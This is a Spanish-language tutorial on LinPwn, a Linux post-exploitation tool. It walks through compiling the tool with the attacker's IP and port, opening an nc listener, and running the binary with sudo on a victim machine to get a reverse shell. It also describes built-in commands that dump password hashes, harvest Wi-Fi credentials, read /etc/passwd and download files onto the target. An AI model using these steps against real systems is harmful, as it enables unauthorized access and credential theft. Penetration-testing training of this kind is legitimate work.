El proyecto LinPwn es una herramienta interactiva de post-explotación diseñada para ayudar en la fase de enumeración y escalada de privilegios en sistemas Linux. Es útil una vez que ya se ha obtenido acceso inicial a una máquina objetivo.

1. Funcionalidad de LinPwn

LinPwn funciona como una utilidad que facilita la comunicación con una máquina comprometida y ofrece comandos internos para realizar tareas comunes de escalada de privilegios.

Características principales:

  • Herramienta Interactiva: Ofrece una interfaz de línea de comandos propia que permite ejecutar comandos internos.
  • Post-Explotación: Su objetivo es la fase posterior a la explotación, centrada en descubrir información y conseguir un mayor nivel de acceso.
  • Conexión Shell Inversa: Está diseñado para establecer una conexión de shell inversa (reverse shell) desde la máquina objetivo (la víctima) hacia tu máquina atacante.

Comandos internos que ofrece LinPwn:

ComandoDescripción
shellEjecuta /bin/sh en el sistema objetivo, lo que te da una shell interactiva para ejecutar comandos.
readfileImprime el contenido de un archivo especificado (ej.: /etc/passwd)
enumerateEjecuta el script LinEnum.sh (una herramienta popular de enumeración de Linux) para recopilar una gran cantidad de información sobre el sistema.
downloadDescarga un archivo en la máquina objetivo desde una URL específica.
wificredzIntenta recopilar las contraseñas guardadas de Wi-Fi.
hashdumpRecopila los hashes de las contraseñas del sistema.

2. Proceso de Instalación (Compilación)

LinPwn está escrito principalmente en C++, por lo que necesita ser compilado en código binario antes de poder usarse.

El repositorio incluye un script de shell llamado build.sh para facilitar este proceso.

Paso 2.1: Clonar el Repositorio

Primero, necesitas clonar el código fuente en tu máquina de ataque:

git clone https://github.com/Andromeda1957/LinPwn.git
cd LinPwn

Paso 2.2: Compilar el Binario

El archivo build.sh es opcional, pero simplifica la compilación:

  1. Ejecuta el script de compilación:
bash build.sh
  1. El script te mostrará las opciones de compilación disponibles y generará el archivo binario LinPwn.
bash build.sh --default

(Nota: Deberías tener un compilador de C++ como g++ instalado en tu sistema para que esto funcione. Si usas un sistema enfocado en seguridad como Kali Linux, ya lo tendrás).

3. Proceso de Ejecución Paso a Paso

Para usar LinPwn, debes configurar una conexión de shell inversa entre tu máquina (el atacante) y la máquina objetivo (donde se ejecutará LinPwn).

Paso 3.1: Configurar la Conexión en el Código (Pre-ejecución)

Antes de compilar, debes editar el código fuente (LinPwn.cc) y establecer la dirección IP y el puerto al que quieres que se conecte el binario, dentro de la clase Connection.

  1. Edita el archivo LinPwn.cc y busca la clase o sección de Connection.
  2. Establece tu IP y puerto de escucha.
  3. Vuelve al Paso 2.2 para compilar el binario con tus datos de conexión.

Paso 3.2: Configurar el Oyente (Máquina Atacante)

En tu máquina de ataque (por ejemplo, Ubuntu), configura un oyente (listener) usando netcat (nc) en el puerto que configuraste en el código de LinPwn.

nc -lvp PUERTO
nc -lvp 4444

Reemplaza PUERTO con el número de puerto que definiste en el código (LinPwn.cc).

Paso 3.3: Ejecutar LinPwn (Máquina Objetivo)

Una vez que tengas el binario LinPwn en la máquina objetivo y tu oyente listo, ejecuta el binario en la máquina objetivo para establecer la conexión:

chmod +x LinPwn
sudo ./LinPwn

Paso 3.4: Usar la Herramienta (Máquina Atacante)

Si la conexión se realiza con éxito, verás una shell interactiva en tu terminal (nc) con el prompt de LinPwn. Luego puedes empezar a ejecutar sus comandos internos:

(LinPwn) > enumerate

Para ejecutar comandos de la shell del sistema:

(LinPwn) > shell
(LinPwn: Shell) > id

(LinPwn: Shell) > exit # Para volver al prompt de LinPwn
